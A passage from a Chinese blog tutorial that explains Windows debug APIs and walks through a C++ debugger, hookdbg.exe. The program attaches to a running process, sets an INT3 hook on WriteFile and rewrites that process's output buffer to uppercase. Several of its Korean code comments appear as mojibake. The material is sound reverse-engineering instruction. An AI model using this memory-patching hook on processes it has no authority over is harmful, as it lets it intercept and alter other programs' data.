class="title function_">WriteProcessMemory</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in]  HANDLE  hProcess,</span></span><br><span class="line"><span class="params">  [in]  LPVOID  lpBaseAddress,</span></span><br><span class="line"><span class="params">  [in]  LPCVOID lpBuffer,</span></span><br><span class="line"><span class="params">  [in]  SIZE_T  nSize,</span></span><br><span class="line"><span class="params">  [out] SIZE_T  *lpNumberOfBytesWritten</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure><p>选取目标进程<code>hProcess</code>的偏移位置<code>lpBaseAddress</code>为起始<strong>写入</strong><code>nSize</code>的内容，待写入内容的存放位置为<code>lpBuffer</code>。至于第五个参数<code>lpNumberOfBytesRead</code>则是用于写入内容到指定变量的地址，为NULL则该字段无效。</p><h5 id="DebugLoop"><a href="#DebugLoop" class="headerlink" title="DebugLoop"></a>DebugLoop</h5><p><a href="https://docs.microsoft.com/en-us/windows/win32/debug/writing-the-debugger-s-main-loop">微软描述</a></p><h5 id="EXCEPTION-RECORD"><a href="#EXCEPTION-RECORD" class="headerlink" title="EXCEPTION_RECORD"></a>EXCEPTION_RECORD</h5><p>是一个结构体，描述着一个异常的信息。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">EXCEPTION_RECORD</span> &#123;</span></span><br><span class="line">  DWORD                    ExceptionCode;</span><br><span class="line">  DWORD                    ExceptionFlags;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">EXCEPTION_RECORD</span> *<span class="title">ExceptionRecord</span>;</span></span><br><span class="line">  PVOID                    ExceptionAddress;</span><br><span class="line">  DWORD                    NumberParameters;</span><br><span class="line">  ULONG_PTR                ExceptionInformation[EXCEPTION_MAXIMUM_PARAMETERS];</span><br><span class="line">&#125; EXCEPTION_RECORD;</span><br></pre></td></tr></table></figure><p>这里就不全介绍，更多的请读者自行<a href="https://docs.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-exception_record">查看文档</a>，介绍第一个参数：<code>ExceptionCode</code>的部分异常码：</p><table><thead><tr><th>Value</th><th>Meaning</th></tr></thead><tbody><tr><td><strong>EXCEPTION_ACCESS_VIOLATION</strong></td><td>The thread tried to read from or write to a virtual address for which it does not have the appropriate access.</td></tr><tr><td><strong>EXCEPTION_ARRAY_BOUNDS_EXCEEDED</strong></td><td>The thread tried to access an array element that is out of bounds and the underlying hardware supports bounds checking.</td></tr><tr><td><strong>EXCEPTION_BREAKPOINT</strong></td><td>A breakpoint was encountered.</td></tr><tr><td><strong>EXCEPTION_FLT_DIVIDE_BY_ZERO</strong></td><td>The thread tried to divide a floating-point value by a floating-point divisor of zero.</td></tr><tr><td><strong>EXCEPTION_FLT_OVERFLOW</strong></td><td>The exponent of a floating-point operation is greater than the magnitude allowed by the corresponding type.</td></tr><tr><td><strong>EXCEPTION_FLT_STACK_CHECK</strong></td><td>The stack overflowed or underflowed as the result of a floating-point operation.</td></tr><tr><td><strong>EXCEPTION_SINGLE_STEP</strong></td><td>A trace trap or other single-instruction mechanism signaled that one instruction has been executed.</td></tr><tr><td>…</td><td>…</td></tr></tbody></table><h5 id="CONTEXT"><a href="#CONTEXT" class="headerlink" title="CONTEXT"></a>CONTEXT</h5><p><a href="https://docs.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-context">结构体</a>，包含程序执行上下文的一些信息（寄存器等），字段很多，篇幅限制，不po出来了。只介绍后文需要用到的<code>CONTEXT.ContextFlags</code> ，含义是在查询的时候<strong>需要设置该字段，表示查询哪些其他的CONTEXT结构字段。</strong>后文使用到的值<code>CONTEXT_CONTROL</code>表明想查看的CONTEXT内容是<code>控制寄存器组CONTEXT_CONTROL</code></p><hr><h4 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h4><p>这里先贴完整源码，再逐部分进行分析</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;windows.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdio.h&quot;</span></span></span><br><span class="line"></span><br><span class="line">LPVOID g_pfWriteFile = <span class="literal">NULL</span>;</span><br><span class="line">CREATE_PROCESS_DEBUG_INFO g_cpdi;</span><br><span class="line">BYTE g_chINT3 = <span class="number">0xCC</span>, g_chOrgByte = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">OnCreateProcessDebugEvent</span><span class="params">(LPDEBUG_EVENT pde)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// WriteFile() API ÁÖ¼Ò ±¸ÇÏ±â</span></span><br><span class="line">    g_pfWriteFile = <span class="built_in">GetProcAddress</span>(<span class="built_in">GetModuleHandleA</span>(<span class="string">&quot;kernel32.dll&quot;</span>), <span class="string">&quot;WriteFile&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// API Hook - WriteFile()</span></span><br><span class="line">    <span class="comment">//   Ã¹ ¹øÂ° byte ¸¦ 0xCC (INT 3) À¸·Î º¯°æ </span></span><br><span class="line">    <span class="comment">//   (orginal byte ´Â ¹é¾÷)</span></span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;g_cpdi, &amp;pde-&gt;u.CreateProcessInfo, <span class="built_in">sizeof</span>(CREATE_PROCESS_DEBUG_INFO));</span><br><span class="line">    <span class="built_in">ReadProcessMemory</span>(g_cpdi.hProcess, g_pfWriteFile, </span><br><span class="line">                      &amp;g_chOrgByte, <span class="built_in">sizeof</span>(BYTE), <span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">WriteProcessMemory</span>(g_cpdi.hProcess, g_pfWriteFile, </span><br><span class="line">                       &amp;g_chINT3, <span class="built_in">sizeof</span>(BYTE), <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">OnExceptionDebugEvent</span><span class="params">(LPDEBUG_EVENT pde)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    CONTEXT ctx;</span><br><span class="line">    PBYTE lpBuffer = <span class="literal">NULL</span>;</span><br><span class="line">    DWORD dwNumOfBytesToWrite, dwAddrOfBuffer, i;</span><br><span class="line">    PEXCEPTION_RECORD per = &amp;pde-&gt;u.Exception.ExceptionRecord;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// BreakPoint exception (INT 3) ÀÎ °æ¿ì</span></span><br><span class="line">    <span class="keyword">if</span>( EXCEPTION_BREAKPOINT == per-&gt;ExceptionCode )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// BP ÁÖ¼Ò°¡ WriteFile() ÀÎ °æ¿ì</span></span><br><span class="line">        <span class="keyword">if</span>( g_pfWriteFile == per-&gt;ExceptionAddress )</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// #1. Unhook</span></span><br><span class="line">            <span class="comment">//   0xCC ·Î µ¤¾î¾´ ºÎºÐÀ» original byte ·Î µÇµ¹¸²</span></span><br><span class="line">            <span class="built_in">WriteProcessMemory</span>(g_cpdi.hProcess, g_pfWriteFile, </span><br><span class="line">                               &amp;g_chOrgByte, <span class="built_in">sizeof</span>(BYTE), <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// #2. Thread Context ±¸ÇÏ±â</span></span><br><span class="line">            ctx.ContextFlags = CONTEXT_CONTROL;</span><br><span class="line">            <span class="built_in">GetThreadContext</span>(g_cpdi.hThread, &amp;ctx);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// #3. WriteFile() ÀÇ param 2, 3 °ª ±¸ÇÏ±â</span></span><br><span class="line">            <span class="comment">//   ÇÔ¼öÀÇ ÆÄ¶ó¹ÌÅÍ´Â ÇØ´ç ÇÁ·Î¼¼½ºÀÇ ½ºÅÃ¿¡ Á¸ÀçÇÔ</span></span><br><span class="line">            <span class="comment">//   param 2 : ESP + 0x8</span></span><br><span class="line">            <span class="comment">//   param 3 : ESP + 0xC</span></span><br><span class="line">            <span class="built_in">ReadProcessMemory</span>(g_cpdi.hProcess, (LPVOID)(ctx.Esp + <span class="number">0x8</span>), </span><br><span class="line">                              &amp;dwAddrOfBuffer, <span class="built_in">sizeof</span>(DWORD), <span class="literal">NULL</span>);</span><br><span class="line">            <span class="built_in">ReadProcessMemory</span>(g_cpdi.hProcess, (LPVOID)(ctx.Esp + <span class="number">0xC</span>), </span><br><span class="line">                              &amp;dwNumOfBytesToWrite, <span class="built_in">sizeof</span>(DWORD), <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// #4. ÀÓ½Ã ¹öÆÛ ÇÒ´ç</span></span><br><span class="line">            lpBuffer = (PBYTE)<span class="built_in">malloc</span>(dwNumOfBytesToWrite+<span class="number">1</span>);</span><br><span class="line">            <span class="built_in">memset</span>(lpBuffer, <span class="number">0</span>, dwNumOfBytesToWrite+<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// #5. WriteFile() ÀÇ ¹öÆÛ¸¦ ÀÓ½Ã ¹öÆÛ¿¡ º¹»ç</span></span><br><span class="line">            <span class="built_in">ReadProcessMemory</span>(g_cpdi.hProcess, (LPVOID)dwAddrOfBuffer, </span><br><span class="line">                              lpBuffer, dwNumOfBytesToWrite, <span class="literal">NULL</span>);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\n### original string ###\n%s\n&quot;</span>, lpBuffer);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// #6. ¼Ò¹®ÀÚ -&gt; ´ë¹®ÀÚ º¯È¯</span></span><br><span class="line">            <span class="keyword">for</span>( i = <span class="number">0</span>; i &lt; dwNumOfBytesToWrite; i++ )</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>( <span class="number">0x61</span> &lt;= lpBuffer[i] &amp;&amp; lpBuffer[i] &lt;= <span class="number">0x7A</span> )</span><br><span class="line">                    lpBuffer[i] -= <span class="number">0x20</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\n### converted string ###\n%s\n&quot;</span>, lpBuffer);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// #7. º¯È¯µÈ ¹öÆÛ¸¦ WriteFile() ¹öÆÛ·Î º¹»ç</span></span><br><span class="line">            <span class="built_in">WriteProcessMemory</span>(g_cpdi.hProcess, (LPVOID)dwAddrOfBuffer, </span><br><span class="line">                               lpBuffer, dwNumOfBytesToWrite, <span class="literal">NULL</span>);</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// #8. ÀÓ½Ã ¹öÆÛ ÇØÁ¦</span></span><br><span class="line">            <span class="built_in">free</span>(lpBuffer);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// #9. Thread Context </span></span><br><span class="line">            ctx.Eip = (DWORD)g_pfWriteFile;</span><br><span class="line">            <span class="built_in">SetThreadContext</span>(g_cpdi.hThread, &amp;ctx);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// #10. Debuggee</span></span><br><span class="line">            <span class="built_in">ContinueDebugEvent</span>(pde-&gt;dwProcessId, pde-&gt;dwThreadId, DBG_CONTINUE);</span><br><span class="line">            <span class="built_in">Sleep</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// #11. API Hook</span></span><br><span class="line">            <span class="built_in">WriteProcessMemory</span>(g_cpdi.hProcess, g_pfWriteFile, </span><br><span class="line">                               &amp;g_chINT3, <span class="built_in">sizeof</span>(BYTE), <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> TRUE;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">DebugLoop</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    DEBUG_EVENT de;</span><br><span class="line">    DWORD dwContinueStatus;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Debuggee</span></span><br><span class="line">    <span class="keyword">while</span>( <span class="built_in">WaitForDebugEvent</span>(&amp;de, INFINITE) )</span><br><span class="line">    &#123;</span><br><span class="line">        dwContinueStatus = DBG_CONTINUE;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Debuggee </span></span><br><span class="line">        <span class="keyword">if</span>( CREATE_PROCESS_DEBUG_EVENT == de.dwDebugEventCode )</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">OnCreateProcessDebugEvent</span>(&amp;de);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>( EXCEPTION_DEBUG_EVENT == de.dwDebugEventCode )</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>( <span class="built_in">OnExceptionDebugEvent</span>(&amp;de) )</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// Debuggee</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>( EXIT_PROCESS_DEBUG_EVENT == de.dwDebugEventCode )</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// debuggee Á¾·á -&gt; debugger Á¾·á</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Debuggee</span></span><br><span class="line">        <span class="built_in">ContinueDebugEvent</span>(de.dwProcessId, de.dwThreadId, dwContinueStatus);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    DWORD dwPID;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( argc != <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\nUSAGE : hookdbg.exe &lt;pid&gt;\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Attach Process</span></span><br><span class="line">    dwPID = <span class="built_in">atoi</span>(argv[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">if</span>( !<span class="built_in">DebugActiveProcess</span>(dwPID) )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;DebugActiveProcess(%d) failed!!!\n&quot;</span></span><br><span class="line">               <span class="string">&quot;Error Code = %d\n&quot;</span>, dwPID, <span class="built_in">GetLastError</span>());</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">DebugLoop</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="main部分"><a href="#main部分" class="headerlink" title="main部分"></a>main部分</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    DWORD dwPID;</span><br><span class="line">    <span class="keyword">if</span>( argc != <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\nUSAGE : hookdbg.exe &lt;pid&gt;\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Attach Process</span></span><br><span class="line">    dwPID = atoi(argv[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">if</span>( !DebugActiveProcess(dwPID) )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;DebugActiveProcess(%d) failed!!!\n&quot;</span></span><br><span class="line">               <span class="string">&quot;Error Code = %d\n&quot;</span>, dwPID, GetLastError());</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    DebugLoop();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>第4行，检查参数</li><li>第11行，转化从命令行接收到的参数为int类型</li><li>第12行，对<code>dwPID</code>调用<code>DebugActiveProcess</code>，该API作用：<code>Enables a debugger to attach to an active process and debug it.</code>使得目标进程能够被其他DebugFunction捕获，其实就是设置目标而已。</li><li>第18行，启用<code>DebugLoop</code>，往下分析<strong>DebugLoop</strong></li></ul><h5 id="DebugLoop-1"><a href="#DebugLoop-1" class="headerlink" title="DebugLoop"></a>DebugLoop</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">DebugLoop</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    DEBUG_EVENT de;</span><br><span class="line">    DWORD dwContinueStatus;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Debuggee</span></span><br><span class="line">    <span class="keyword">while</span>( WaitForDebugEvent(&amp;de, INFINITE) )</span><br><span class="line">    &#123;</span><br><span class="line">        dwContinueStatus = DBG_CONTINUE;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Debuggee </span></span><br><span class="line">        <span class="keyword">if</span>( CREATE_PROCESS_DEBUG_EVENT == de.dwDebugEventCode )</span><br><span class="line">        &#123;</span><br><span class="line">            OnCreateProcessDebugEvent(&amp;de);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>( EXCEPTION_DEBUG_EVENT == de.dwDebugEventCode )</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>( OnExceptionDebugEvent(&amp;de) )</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// Debuggee</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>( EXIT_PROCESS_DEBUG_EVENT == de.dwDebugEventCode )</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// debuggee Á¾·á -&gt; debugger Á¾·á</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Debuggee</span></span><br><span class="line">        ContinueDebugEvent(de.dwProcessId, de.dwThreadId, dwContinueStatus);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>WaitForDebugEvent</code>：写在<code>DebugLoop</code>的开始，作用是等待被调试者的调试事件发生，<a href="https://docs.microsoft.com/en-us/windows/win32/api/debugapi/nf-debugapi-waitfordebugevent">函数原型</a>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">BOOL <span class="title function_">WaitForDebugEvent</span><span class="params">(</span></span><br><span class="line"><span class="params">  [out] LPDEBUG_EVENT lpDebugEvent,</span></span><br><span class="line"><span class="params">  [in]  DWORD         dwMilliseconds</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure><p>含义是再<code>dwMilliseconds</code>时间区间内等待被调试程序中的调试事件。参考文档，发现当<code>dwMilliseconds</code> &#x3D; INFINITE 则意味着无限等待，直至被调试者触发异常事件，异常事件存放在<code>lpDebugEvent</code></p><p><code>dwContinueStatus</code>是配合后面的<code>ContinueDebugEvent</code>使用的，<a href="https://docs.microsoft.com/en-us/windows/win32/api/debugapi/nf-debugapi-continuedebugevent">相关文档</a> 函数原型：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">BOOL <span class="title function_">ContinueDebugEvent</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in] DWORD dwProcessId,</span></span><br><span class="line"><span class="params">  [in] DWORD dwThreadId,</span></span><br><span class="line"><span class="params">  [in] DWORD dwContinueStatus</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure><p><code>dwContinueStatus</code> 是为了配合DebugLop中的<code>ContinueDebugEvent</code>使用</p><blockquote><p>配合<code>ContinueDebugEvent</code>，使得系统允许调试唤起先前由于异常事件而挂起的线程。当<code>ContinueDebugEvent.dwContinueStatus</code>则决定了以什么方式唤起被挂起的线程（<code>dwThreadId</code>）：</p><ol><li><code>DBG_CONTINUE</code>：如果<code>ContinueDebugEvent</code>唤起的<strong>dwThreadId</strong>线程此前报告了<strong>EXCEPTION_DEBUG_EVENT</strong>异常事件，则意味着停止所有异常处理并进行进程运行，对于任何其他调试事件，此标志意味着继续执行线程。（放行）</li><li><code>DBG_EXCEPTION_NOT_HANDLED</code>：如果<code>ContinueDebugEvent</code>唤起的<strong>dwThreadId</strong>线程此前报告了<strong>EXCEPTION_DEBUG_EVENT</strong>异常事件，则意味着进行相应的异常处理。（处理）</li></ol></blockquote><p>回到<code>WaitForDebugEvent</code>，第7-31行完成的事循环等待<code>DebugEvent</code>发生，再根据<code>DebugEvent</code>的具体事件进行相应的处理。</p><h6 id="CREATE-PROCESS-DEBUG-EVENT"><a href="#CREATE-PROCESS-DEBUG-EVENT" class="headerlink" title="CREATE_PROCESS_DEBUG_EVENT"></a>CREATE_PROCESS_DEBUG_EVENT</h6><p><code>CREATE_PROCESS_DEBUG_EVENT == de.dwDebugEventCode</code>，当调试事件是进程创建，执行<code>OnCreateProcessDebugEvent(&amp;de);</code>执行内容如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">BOOL <span class="title function_">OnCreateProcessDebugEvent</span><span class="params">(LPDEBUG_EVENT pde)</span></span><br><span class="line">&#123;</span><br><span class="line">    g_pfWriteFile = GetProcAddress(GetModuleHandleA(<span class="string">&quot;kernel32.dll&quot;</span>), <span class="string">&quot;WriteFile&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;g_cpdi, &amp;pde-&gt;u.CreateProcessInfo, </span><br><span class="line">           <span class="keyword">sizeof</span>(CREATE_PROCESS_DEBUG_INFO));</span><br><span class="line">    ReadProcessMemory(g_cpdi.hProcess, g_pfWriteFile, </span><br><span class="line">                      &amp;g_chOrgByte, <span class="keyword">sizeof</span>(BYTE), <span class="literal">NULL</span>);</span><br><span class="line">    WriteProcessMemory(g_cpdi.hProcess, g_pfWriteFile, </span><br><span class="line">                       &amp;g_chINT3, <span class="keyword">sizeof</span>(BYTE), <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>理解上述内容需要查找<code>DebugEvent</code>中的描述，上文提及了。这里观察<code>CREATE_PROCESS_DEBUG_EVENT</code>的描述，此时<code>pde-&gt;u.CreateProcessInfo</code>指向结构体<code>CREATE_PROCESS_DEBUG_INFO</code>保存当前进程的一些信息：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">CREATE_PROCESS_DEBUG_INFO</span> &#123;</span></span><br><span class="line">  HANDLE                 hFile;</span><br><span class="line">  HANDLE                 hProcess;</span><br><span class="line">  HANDLE                 hThread;</span><br><span class="line">  LPVOID                 lpBaseOfImage;</span><br><span class="line">  DWORD                  dwDebugInfoFileOffset;</span><br><span class="line">  DWORD                  nDebugInfoSize;</span><br><span class="line">  LPVOID                 lpThreadLocalBase;</span><br><span class="line">  LPTHREAD_START_ROUTINE lpStartAddress;</span><br><span class="line">  LPVOID                 lpImageName;</span><br><span class="line">  WORD                   